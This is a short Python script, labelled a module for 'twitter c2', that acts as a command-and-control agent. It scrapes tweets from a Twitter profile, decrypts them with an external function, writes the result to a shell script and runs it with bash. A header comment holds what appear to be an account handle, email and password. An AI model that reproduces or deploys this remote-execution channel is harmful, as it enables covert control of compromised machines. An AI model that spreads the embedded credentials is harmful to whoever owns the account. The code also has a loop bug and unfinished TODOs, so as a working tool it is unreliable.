# module for twitter c2
# kolache2 : a3829593@drdrb.net : Fl@kyP@stry!@#!@#

import urllib, os
execfile("tweet2-crypto.py")

#need to fix for actual twitter handle
urlhandle = urllib.urlopen("http://twitter.com/kolache2")
urldata = urlhandle.read()

filehdl = open("tweet2.sh", "w")

c=0
while c < len(urldata):
	ccont = urldata.find("js-tweet-text", c)
	if ccont == -1:
		# nothing to do here
		print("No tweets available")
		exit(-1)
	prstr = urldata[ccont:urldata.find("</p>",ccont)]
	# need to add memory of tweets already parsed
	encstr = prstr[prstr.find(">")+1:]
	decstr = decryption(encstr)
	filehdl.write(decstr)
	c = c + ccont + len(prstr)

filehdl.close()
os.system("bash tweet2.sh")
